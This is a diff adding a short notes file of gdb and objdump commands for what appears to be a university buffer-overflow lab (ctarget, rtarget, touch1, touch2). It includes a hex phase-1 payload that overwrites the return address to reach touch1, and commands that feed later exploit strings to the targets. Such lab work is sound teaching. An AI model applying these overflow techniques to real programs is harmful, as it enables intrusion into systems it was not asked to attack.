@@ -1,0 +1,25 @@
+objdump -d ./rtarget
+objdump -d ./rtarget > rt.txt
+
+b test
+ b *0x401ae0
+ b getbuf
+disas test
+disas getbuf
+disas touch1
+p $rsp
+ x/1xg $rsp
+
+gdb ctarget
+gdb rtarget
+
+./hex2raw < phase5.txt > phase5_raw.txt
+echo "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e1 1a 40 00 00 00 00 00" > phase1.txt
+
+./ctarget -i phase1_raw.txt
+./rtarget -i phase5_raw.txt
+ run -i phase3_raw.txt
+ 
+ gcc -c l3.s
+ objdump -d l3.o
+objdump -d rtarget | grep -w touch2
